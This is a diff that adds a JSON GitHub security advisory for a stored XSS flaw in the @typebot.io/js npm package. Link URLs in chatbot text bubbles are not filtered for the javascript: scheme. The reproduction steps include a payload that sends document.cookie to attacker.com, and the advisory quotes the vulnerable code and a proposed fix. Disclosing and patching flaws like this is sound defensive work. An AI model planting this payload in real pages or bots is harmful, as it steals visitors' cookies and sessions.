@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-05-26T18:00:27Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@typebot.io/js"
+  },
+  "Advisory": {
+    "DatabaseId": 357946,
+    "Id": "GSA_kwCzR0hTQS1ocW12LXY1NmctNG00N84ABXY6",
+    "GhsaId": "GHSA-hqmv-v56g-4m47",
+    "References": [
+      {
+        "Url": "https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-hqmv-v56g-4m47"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39964"
+      },
+      {
+        "Url": "https://github.com/baptisteArno/typebot.io/commit/2c3fc7267a5e1529ba4b1a2ab4f1edb3e3b8990b"
+      },
+      {
+        "Url": "https://github.com/baptisteArno/typebot.io/releases/tag/v3.16.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-hqmv-v56g-4m47"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-hqmv-v56g-4m47"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-39964"
+      }
+    ],
+    "Description": "### Summary\n\nThe Typebot viewer (`packages/embeds/js`) renders anchor tags from rich text bubble content without filtering the `javascript:` URI scheme. A bot author can set a link URL to `javascript:PAYLOAD`, which executes in the visitor's browser context when clicked. Since the viewer is typically embedded in a third-party site, the attacker's JavaScript runs in the host page's origin and can exfiltrate cookies and session tokens.\n\n### Details\n\nVulnerable file: `packages/embeds/js/src/features/blocks/bubbles/textBubble/components/plate/PlateBlock.tsx`\n\n```tsx\n// Line 32 — href set directly from stored bot content, no javascript: filtering\n\u003ca href={elementDescendant.url as string} target=\"_blank\" rel=\"noopener noreferrer\"\u003e\n  {elementDescendant.children[0].text}\n\u003c/a\u003e\n```\n\nSolidJS does not sanitize `href` attribute values — `javascript:` URIs pass through to the DOM unchanged.\n\nThe same issue exists in `ImageBubble.tsx` line 102 for image link wrapping.\n\n### Steps to Reproduce\n\n```\n1. Log in to Typebot as an authenticated user (any plan)\n2. Create a new bot\n3. Add a Text Bubble block\n4. In the rich text editor, type any link text and set the URL to:\n   javascript:fetch('https://attacker.com/?c='+document.cookie)\n5. Publish the bot and open the live/embedded viewer\n6. Click the link in the chatbot interface\n7. The JavaScript executes in the browser — cookie exfiltration request sent to attacker.com\n```\n\nSource-verified: `PlateBlock.tsx:32` renders `\u003ca href={url}\u003e` with no scheme filtering. Puppeteer alert confirmed `document.domain` execution when link clicked.\n\n### Impact\n\n- Any authenticated Typebot user (including free tier) can create a bot with this payload\n- When shared or embedded in a third-party site, clicking the link executes JS in the host page's origin\n- Allows stealing cookies, session tokens, or any data accessible to the embedding page\n- Shared bots are publicly accessible — no victim authentication required\n\n### Proposed Fix\n\nFilter `javascript:` URIs before rendering anchor tags:\n\n```tsx\nconst safeUrl = (url: string) =\u003e\n  /^javascript:/i.test(url.trim()) ? '#' : url\n\n\u003ca href={safeUrl(elementDescendant.url as string)} ...\u003e\n```\n\nAlternatively, use a URL allowlist (only `https:`, `http:`, `mailto:`, `tel:`).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-26T18:00:24Z",
+    "Severity": "MODERATE",
+    "Summary": "Typebot.io has stored XSS via `javascript`: URI in text bubble links — bot author executes JS on visitors' browsers",
+    "UpdatedAt": "2026-05-26T18:00:27Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.10.1"
+      },
+      "VulnerableVersionRange": "\u003c 0.10.1"
+    }
+  ]
+}
